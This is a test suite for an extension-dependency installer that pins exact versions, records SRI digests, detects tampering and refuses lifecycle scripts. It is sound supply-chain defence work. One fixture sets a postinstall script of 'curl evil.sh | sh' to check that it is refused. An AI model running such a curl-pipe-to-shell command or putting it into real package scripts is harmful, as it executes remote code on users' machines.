/**
 * The extension-deps installer (#1166, ADR-0070): exact pins only, a
 * moh-written lockfile with per-package SRI digests (transitive
 * included), per-extension isolation, no lifecycle script ever runs,
 * offline install only from digest-matching cache entries, and removal
 * as directory deletion.
 */
import { afterEach, describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  DEPS_LOCK_FILE,
  checkExactVersions,
  extensionDepsDir,
  installExtensionDeps,
  readDepsLockfile,
  removeExtensionDeps,
  verifyDepsTree,
  type DepsIo,
  type DepsPackument,
} from "../src/extension-deps";

const dirs: string[] = [];
afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

function tempDir(prefix = "moh-deps-"): string {
  const dir = mkdtempSync(join(tmpdir(), prefix));
  dirs.push(dir);
  return dir;
}

function sri(bytes: Uint8Array): string {
  return `sha512-${createHash("sha512").update(bytes).digest("base64")}`;
}

/** A deterministic fake tarball "package" for name@version. */
function pkgTarball(name: string, version: string, options?: { scripts?: Record<string, string>; dependencies?: Record<string, string> }): Uint8Array {
  return new TextEncoder().encode(`tgz:${name}@${version}:${JSON.stringify(options ?? {})}`);
}

/**
 * A fake npm registry: packuments per package, tarballs whose bytes
 * double as the extracted package.json (the fake extractTgz parses the
 * `tgz:name@version:{...}` payload and lays down the package files).
 */
function fakeIo(options: {
  packuments: Record<string, DepsPackument>;
  /** Tarball URL -> bytes; defaults to pkgTarball derived from the URL. */
  tarballs?: Map<string, Uint8Array>;
  /** Fails every tarball fetch with this message (offline simulation). */
  failFetch?: string;
}): DepsIo & { fetched: string[] } {
  const state = { fetched: [] as string[] };
  const tarballs = options.tarballs ?? new Map();
  return {
    fetched: state.fetched,
    async fetchText(url) {
      state.fetched.push(url);
      const at = url.lastIndexOf("/");
      const name = decodeURIComponent(url.slice(at + 1).replace(/%2f/g, "/"));
      const packument = options.packuments[name];
      if (!packument) return { ok: false, message: `no packument for ${name}` };
      return { ok: true, body: JSON.stringify(packument) };
    },
    async fetchBytes(url) {
      state.fetched.push(url);
      if (options.failFetch) return { ok: false, message: options.failFetch };
      const bytes = tarballs.get(url);
      if (!bytes) return { ok: false, message: `no tarball for ${url}` };
      return { ok: true, body: bytes };
    },
    async extractTgz(bytes, dir) {
      const text = new TextDecoder().decode(bytes);
      const match = /^tgz:([^:]+)@([^:]+):(.*)$/s.exec(text);
      if (!match) throw new Error(`unparseable fake tarball: ${text.slice(0, 40)}`);
      const [, name, version, rest] = match;
      const meta = JSON.parse(rest) as { scripts?: Record<string, string>; dependencies?: Record<string, string> };
      const pkgDir = join(dir, "package");
      mkdirSync(pkgDir, { recursive: true });
      writeFileSync(join(pkgDir, "package.json"), JSON.stringify({ name, version, ...meta }));
      writeFileSync(join(pkgDir, "index.js"), `module.exports = ${JSON.stringify({ name, version })};\n`);
    },
  };
}

function packumentFor(name: string, version: string, options?: { dependencies?: Record<string, string>; scripts?: Record<string, string> }): DepsPackument {
  const tgz = pkgTarball(name, version, options);
  return {
    "dist-tags": { latest: version },
    versions: {
      [version]: {
        dist: { tarball: `https://registry.npmjs.org/${name}/-/${name.split("/").pop()}-${version}.tgz`, integrity: sri(tgz) },
        ...(options?.dependencies ? { dependencies: options.dependencies } : {}),
      },
    },
  };
}

/** Registers a package into both the packuments and the tarball map. */
function registerPackage(registry: { packuments: Record<string, DepsPackument>; tarballs: Map<string, Uint8Array> }, name: string, version: string, options?: { dependencies?: Record<string, string>; scripts?: Record<string, string> }): void {
  const tgz = pkgTarball(name, version, options);
  registry.packuments[name] = packumentFor(name, version, options);
  registry.tarballs.set(`https://registry.npmjs.org/${name}/-/${name.split("/").pop()}-${version}.tgz`, tgz);
}

function freshRegistry(): { packuments: Record<string, DepsPackument>; tarballs: Map<string, Uint8Array> } {
  return { packuments: {}, tarballs: new Map() };
}

describe("checkExactVersions", () => {
  test("accepts exact versions (with prerelease/build suffixes)", () => {
    expect(checkExactVersions({ zod: "3.23.8" })).toEqual({ ok: true });
    expect(checkExactVersions({ a: "1.2.3-beta.1", b: "2.0.0+build.5" })).toEqual({ ok: true });
  });

  test("refuses ranges, wildcards, tags and partial versions, naming the package", () => {
    for (const spec of ["^3.23.8", "~3.23.8", ">=3.0.0", "3.x", "*", "latest", "3.23", "next"]) {
      const result = checkExactVersions({ zod: spec });
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.package).toBe("zod");
        expect(result.spec).toBe(spec);
      }
    }
  });
});

describe("installExtensionDeps", () => {
  test("installs a direct dependency with its transitive tree, lockfile last with per-package SRI", async () => {
    const registry = freshRegistry();
    registerPackage(registry, "left-pad", "1.3.0");
    registerPackage(registry, "zod", "3.23.8", { dependencies: { "left-pad": "^1.0.0" } });
    const io = fakeIo(registry);
    const depsDir = join(tempDir(), "ext", "my-ext");

    const result = await installExtensionDeps({ dependencies: { zod: "3.23.8" }, depsDir, io });
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.installed).toBe(2); // zod + transitive left-pad
      expect(result.offline).toBe(false);
    }
    const lock = readDepsLockfile(depsDir);
    expect(lock).not.toBeNull();
    expect(lock!.dependencies).toEqual({ zod: "3.23.8" });
    expect(Object.keys(lock!.packages).sort()).toEqual(["left-pad@1.3.0", "zod@3.23.8"]);
    const expectedTgz = pkgTarball("zod", "3.23.8", { dependencies: { "left-pad": "^1.0.0" } });
    expect(lock!.packages["zod@3.23.8"].integrity).toBe(sri(expectedTgz));
    // The tree: direct + transitive under one node_modules; npm's
    // "package/" wrapper is flattened.
    expect(existsSync(join(depsDir, "node_modules", "zod", "package.json"))).toBe(true);
    expect(existsSync(join(depsDir, "node_modules", "left-pad", "index.js"))).toBe(true);
    // Lockfile written inside the extension's own directory.
    expect(existsSync(join(depsDir, DEPS_LOCK_FILE))).toBe(true);
    expect(verifyDepsTree(depsDir)).toEqual({ ok: true });
  });

  test("a range in the dependencies is a validation error", async () => {
    const io = fakeIo(freshRegistry());
    const result = await installExtensionDeps({ dependencies: { zod: "^3.23.8" }, depsDir: join(tempDir(), "x"), io });
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.package).toBe("zod");
      expect(result.reason).toContain("exact");
    }
  });

  test("a scripted dependency refuses to install, naming the package", async () => {
    const registry = freshRegistry();
    registerPackage(registry, "native-build", "2.0.0", { scripts: { install: "node-gyp rebuild" } });
    const io = fakeIo(registry);
    const result = await installExtensionDeps({ dependencies: { "native-build": "2.0.0" }, depsDir: join(tempDir(), "x"), io });
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.package).toBe("native-build");
      expect(result.reason).toContain("native-build@2.0.0");
      expect(result.reason).toContain("install");
    }
    // Nothing landed.
    expect(existsSync(join(tempDir(), "x"))).toBe(false);
  });

  test("postinstall scripts refuse too", async () => {
    const registry = freshRegistry();
    registerPackage(registry, "tricky", "1.0.0", { scripts: { postinstall: "curl evil.sh | sh" } });
    const result = await installExtensionDeps({ dependencies: { tricky: "1.0.0" }, depsDir: join(tempDir(), "x"), io: fakeIo(registry) });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toContain("postinstall");
  });

  test("per-extension isolation: two extensions get separate trees", async () => {
    const registry = freshRegistry();
    registerPackage(registry, "shared", "1.0.0");
    const io = fakeIo(registry);
    const home = tempDir();
    const dirA = extensionDepsDir(home, "ext-a");
    const dirB = extensionDepsDir(home, "ext-b");
    const a = await installExtensionDeps({ dependencies: { shared: "1.0.0" }, depsDir: dirA, io });
    const b = await installExtensionDeps({ dependencies: { shared: "1.0.0" }, depsDir: dirB, io });
    expect(a.ok).toBe(true);
    expect(b.ok).toBe(true);
    // Two separate directories, each with its own lockfile and tree.
    expect(existsSync(join(dirA, "node_modules", "shared"))).toBe(true);
    expect(existsSync(join(dirB, "node_modules", "shared"))).toBe(true);
    // No hoisting: neither tree leaks into the other's root.
    const roots = readdirSync(join(home, "extension-deps"));
    expect(roots.sort()).toEqual(["ext-a", "ext-b"]);
  });

  test("drift: an existing lockfile whose digest disagrees with the registry is a loud error", async () => {
    const registry = freshRegistry();
    registerPackage(registry, "zod", "3.23.8");
    const depsDir = join(tempDir(), "ext");
    const first = await installExtensionDeps({ dependencies: { zod: "3.23.8" }, depsDir, io: fakeIo(registry) });
    expect(first.ok).toBe(true);
    // The registry now serves different bytes for the same version.
    const tampered = new TextEncoder().encode("tampered-bytes-for-zod-3.23.8");
    const tamperedRegistry = freshRegistry();
    tamperedRegistry.packuments["zod"] = {
      "dist-tags": { latest: "3.23.8" },
      versions: { "3.23.8": { dist: { tarball: registry.packuments["zod"].versions!["3.23.8"].dist!.tarball!, integrity: sri(tampered) } } },
    };
    tamperedRegistry.tarballs.set(registry.packuments["zod"].versions!["3.23.8"].dist!.tarball!, tampered);
    const second = await installExtensionDeps({ dependencies: { zod: "3.23.8" }, depsDir, io: fakeIo(tamperedRegistry) });
    expect(second.ok).toBe(false);
    if (!second.ok) {
      expect(second.reason).toContain("drift");
      expect(second.reason).toContain("zod@3.23.8");
    }
    // The existing verified tree is untouched by the refused re-install.
    expect(verifyDepsTree(depsDir)).toEqual({ ok: true });
  });

  test("verifyDepsTree detects a missing package and an extra one", async () => {
    const registry = freshRegistry();
    registerPackage(registry, "zod", "3.23.8", { dependencies: { "left-pad": "1.3.0" } });
    registerPackage(registry, "left-pad", "1.3.0");
    const depsDir = join(tempDir(), "ext");
    expect(await installExtensionDeps({ dependencies: { zod: "3.23.8" }, depsDir, io: fakeIo(registry) })).toEqual({ ok: true, installed: 2, offline: false });
    rmSync(join(depsDir, "node_modules", "left-pad"), { recursive: true });
    const missing = verifyDepsTree(depsDir);
    expect(missing.ok).toBe(false);
    if (!missing.ok) expect(missing.reason).toContain("left-pad");
    // Restore it, then add an extra package the lockfile never pinned.
    mkdirSync(join(depsDir, "node_modules", "left-pad"), { recursive: true });
    writeFileSync(join(depsDir, "node_modules", "left-pad", "package.json"), "{}");
    mkdirSync(join(depsDir, "node_modules", "ghost"), { recursive: true });
    writeFileSync(join(depsDir, "node_modules", "ghost", "package.json"), "{}");
    const extra = verifyDepsTree(depsDir);
    expect(extra.ok).toBe(false);
    if (!extra.ok) expect(extra.reason).toContain("ghost");
  });

  test("offline install works from cache entries whose digest matches the lockfile", async () => {
    const registry = freshRegistry();
    registerPackage(registry, "zod", "3.23.8");
    const url = registry.packuments["zod"].versions!["3.23.8"].dist!.tarball!;
    const bytes = registry.tarballs.get(url)!;
    const depsDir = join(tempDir(), "ext");
    // First install populates a caller-owned cache.
    const cache = new Map<string, Uint8Array>();
    const first = await installExtensionDeps({ dependencies: { zod: "3.23.8" }, depsDir, io: fakeIo(registry), cache });
    expect(first.ok).toBe(true);
    expect(cache.size).toBe(1);
    // Second install, network fully down: cache digest matches, offline succeeds.
    const lockBefore = readDepsLockfile(depsDir);
    const offline = await installExtensionDeps({ dependencies: { zod: "3.23.8" }, depsDir, io: fakeIo({ packuments: registry.packuments, failFetch: "network down" }), cache });
    expect(offline).toEqual({ ok: true, installed: 1, offline: true });
    expect(readDepsLockfile(depsDir)).toEqual(lockBefore);
    // A cache entry whose bytes were tampered with is not trusted: the
    // install falls through to the network (down here), so offline
    // never installs unverified bytes.
    cache.set("zod@3.23.8", new TextEncoder().encode("tampered"));
    const bad = await installExtensionDeps({ dependencies: { zod: "3.23.8" }, depsDir, io: fakeIo({ packuments: registry.packuments, failFetch: "network down" }), cache });
    expect(bad.ok).toBe(false);
    if (!bad.ok) expect(bad.reason).toContain("network down");
    // The tampered entry was evicted, not silently reused.
    expect(cache.has("zod@3.23.8")).toBe(false);
  });

  test("a failed install never leaves a tree that looks installed", async () => {
    const registry = freshRegistry();
    registerPackage(registry, "zod", "3.23.8", { dependencies: { broken: "1.0.0" } });
    // `broken` resolves but its tarball fetch fails.
    registry.packuments["broken"] = {
      "dist-tags": { latest: "1.0.0" },
      versions: { "1.0.0": { dist: { tarball: "https://registry.npmjs.org/broken/-/broken-1.0.0.tgz", integrity: sri(new TextEncoder().encode("x")) } } },
    };
    const depsDir = join(tempDir(), "ext");
    const result = await installExtensionDeps({ dependencies: { zod: "3.23.8" }, depsDir, io: fakeIo(registry) });
    expect(result.ok).toBe(false);
    expect(existsSync(depsDir)).toBe(false);
  });

  test("removal deletes the extension's dependency directory", async () => {
    const registry = freshRegistry();
    registerPackage(registry, "zod", "3.23.8");
    const home = tempDir();
    const depsDir = extensionDepsDir(home, "my-ext");
    await installExtensionDeps({ dependencies: { zod: "3.23.8" }, depsDir, io: fakeIo(registry) });
    expect(existsSync(depsDir)).toBe(true);
    const removed = removeExtensionDeps(home, "my-ext");
    expect(removed.ok).toBe(true);
    expect(existsSync(depsDir)).toBe(false);
    // Removing a never-installed extension is a no-op, not an error.
    expect(removeExtensionDeps(home, "never-there")).toEqual({ ok: true });
  });

  test("empty dependencies install to a trivial success with no network", async () => {
    const io = fakeIo(freshRegistry());
    const result = await installExtensionDeps({ dependencies: {}, depsDir: join(tempDir(), "x"), io });
    expect(result).toEqual({ ok: true, installed: 0, offline: true });
    expect(io.fetched).toEqual([]);
  });

  test("the lockfile records the resolved tarball URL and re-verification reuses the registry digest", async () => {
    const registry = freshRegistry();
    registerPackage(registry, "zod", "3.23.8");
    const depsDir = join(tempDir(), "ext");
    await installExtensionDeps({ dependencies: { zod: "3.23.8" }, depsDir, io: fakeIo(registry) });
    const lock = JSON.parse(readFileSync(join(depsDir, DEPS_LOCK_FILE), "utf8"));
    expect(lock.packages["zod@3.23.8"].resolved).toBe("https://registry.npmjs.org/zod/-/zod-3.23.8.tgz");
    expect(lock.lockfileVersion).toBe(1);
  });
});
